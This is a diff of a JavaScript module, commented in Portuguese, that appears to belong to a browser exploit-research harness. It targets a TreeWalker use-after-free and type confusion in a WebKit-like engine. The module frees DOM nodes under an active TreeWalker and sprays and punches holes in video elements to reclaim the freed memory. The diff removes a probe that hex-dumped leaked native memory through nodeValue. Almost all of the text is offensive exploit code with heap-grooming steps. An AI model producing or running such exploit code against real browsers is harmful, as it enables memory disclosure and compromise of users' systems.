@@ -3,69 +3,44 @@ import { Groomer } from '../mod_groomer.js';
 
 export default {
     id:       'TREEWALKER_TYPE_CONFUSION',
-    category: 'Exploit',
-    risk:     'CRITICAL',
+    category: 'DOM',
+    risk:     'HIGH',
     description:
-        'Primitiva de Info Leak: Explora a sobreposição exata de um TextNode e um SPAN. ' +
-        'O tamanho em bytes da alocação foi restaurado para o original. Tentamos ler ' +
-        'a memória C++ bruta vazada através da propriedade nodeValue.',
+        'O TreeWalker C++ retém ponteiros nativos. Mutamos os nós por baixo e forçamos ' +
+        'outros tipos (vídeo/áudio) a ocuparem o mesmo espaço de memória (Type Confusion).',
 
     setup: function() {
         this.sandbox = document.createElement('div');
-        
-        // 🚨 A ESTRUTURA ORIGINAL EXATA! (Sem adicionar caracteres extra)
-        // Isso garante que o TextNode "A" tenha o tamanho perfeito no bmalloc.
         this.sandbox.innerHTML = '<span>A</span><b>B</b><i>C</i>';
         document.body.appendChild(this.sandbox);
         
         this.walker = document.createTreeWalker(this.sandbox, NodeFilter.SHOW_ALL, null, false);
         this.walker.nextNode(); // span
-        this.walker.nextNode(); // text "A" (O nosso alvo que tem o tamanho perfeito)
+        this.walker.nextNode(); // b
         
         this.targetNode = this.walker.currentNode;
 
+        // 🚨 Oráculo: Vigia o Nó B
         if (GCOracle.registry) GCOracle.registry.register(this.targetNode, `${this.id}_target`);
     },
 
     trigger: function() {
-        // 1. O GATILHO ORIGINAL EXATO! Destrói o DOM e liberta os nós.
+        // Destrói os nós onde o Walker está pisando.
         this.sandbox.innerHTML = '<video></video><audio></audio>';
         
-        // 2. O CAOS DE MEMÓRIA (Substitui a necessidade de rodar 16 testes)
-        // Alocamos SPANs na tentativa de um deles ocupar o "balde" exato deixado pelo TextNode.
-        let nodes = Groomer.sprayDOM('span', 200);
+        // 🚨 Grooming: Forçamos a alocação de objetos complexos (vídeos)
+        // para tentarem preencher o endereço de memória deixado pelo <b> (Type Confusion)
+        let nodes = Groomer.sprayDOM('video', 100);
         Groomer.punchHoles(nodes, 2);
     },
 
     probe: [
-        // Probe 0 (A antiga Probe 1 da sua foto): 
-        // Verifica se o nó mudou de #text para SPAN
+        s => s.walker.currentNode.nodeType,
         s => s.walker.currentNode.nodeName,
-        
-        // Probe 1: O Extrator de Memória (Info Leak)
-        s => {
-            let nodeName = s.walker.currentNode.nodeName;
-            
-            // Só tentamos o Leak SE a confusão de tipos tiver acontecido (ex: virou SPAN)
-            if (nodeName !== '#text') {
-                try {
-                    let leakedData = s.walker.currentNode.nodeValue || s.walker.currentNode.data;
-                    
-                    if (leakedData && leakedData !== 'A') {
-                        let hexDump = '';
-                        // Lemos os primeiros 16 bytes corrompidos
-                        for (let i = 0; i < Math.min(leakedData.length, 16); i++) {
-                            hexDump += leakedData.charCodeAt(i).toString(16).padStart(4, '0') + ' ';
-                        }
-                        return `💥 INFO LEAK: ${hexDump}`;
-                    }
-                    return `Corrompido para ${nodeName}, mas sem texto legível.`;
-                } catch(e) {
-                    return `Crash na leitura: ${e.message}`;
-                }
-            }
-            return 'Falhou: O nó ainda é um #text normal.';
-        }
+        s => s.walker.currentNode.isConnected, 
+        s => s.walker.previousNode() !== null, 
+        s => s.targetNode.nodeType,            
+        s => s.targetNode.isConnected          
     ],
 
     cleanup: function() {
